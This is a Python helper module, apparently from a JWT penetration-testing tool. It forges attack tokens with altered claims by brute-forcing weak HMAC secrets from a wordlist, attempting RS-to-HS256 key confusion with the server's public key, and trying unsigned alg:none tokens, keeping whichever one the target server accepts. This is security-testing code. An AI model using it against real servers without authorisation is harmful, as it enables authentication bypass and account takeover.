"""Small helpers shared by the checks."""

from ..tokens import (
    brute_force_secret,
    decode_no_verify,
    forge_alg_none,
    forge_hs256,
    get_header_alg,
    resign,
    tamper_claims,
)

WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "admin", "jwt",
    "secretkey", "test", "letmein", "qwerty", "password123", "key",
]

_UNSET = object()


def login_token(client):
    token, _ = client.login()
    if not token:
        raise RuntimeError("login did not return a token")
    return token


def is_accepted(resp):
    return 200 <= resp.status_code < 300


def load_wordlist(cfg):
    if not cfg.wordlist:
        return WEAK_SECRETS
    with open(cfg.wordlist, encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


def forge_with_bad_claim(client, changes):
    """Build an attack token that differs from a real one by `changes`.

    When the tool can make a signature the server accepts (a cracked secret, RSA
    confusion, or accepted alg:none), sign a fresh token so only the claim is
    wrong. Otherwise tamper a real token and leave its old signature, which a
    server that verifies signatures will reject.
    """
    token = login_token(client)
    signer = _attack_signer(client)
    if signer is not None:
        claims = decode_no_verify(token)
        claims.update(changes)
        return signer(claims)
    return tamper_claims(token, changes)


def _attack_signer(client):
    """A signer the server accepts, resolved once per client, or None."""
    cached = getattr(client, "_attack_signer", _UNSET)
    if cached is not _UNSET:
        return cached
    signer = _resolve_signer(client)
    client._attack_signer = signer
    return signer


def _resolve_signer(client):
    cfg = client.config
    token, _ = client.login()
    if not token:
        return None
    alg = get_header_alg(token) or ""
    claims = decode_no_verify(token)

    if alg.startswith("HS"):
        secret = brute_force_secret(token, load_wordlist(cfg), alg)
        if secret:
            return lambda c: resign(c, secret, alg)

    if alg.startswith(("RS", "ES", "PS")) and cfg.public_key:
        with open(cfg.public_key, "rb") as f:
            public_key = f.read()
        if _server_accepts(client, forge_hs256(claims, public_key)):
            return lambda c: forge_hs256(c, public_key)

    if _server_accepts(client, forge_alg_none(claims)):
        return forge_alg_none

    return None


def _server_accepts(client, token):
    return is_accepted(client.get(client.config.user_path, token))
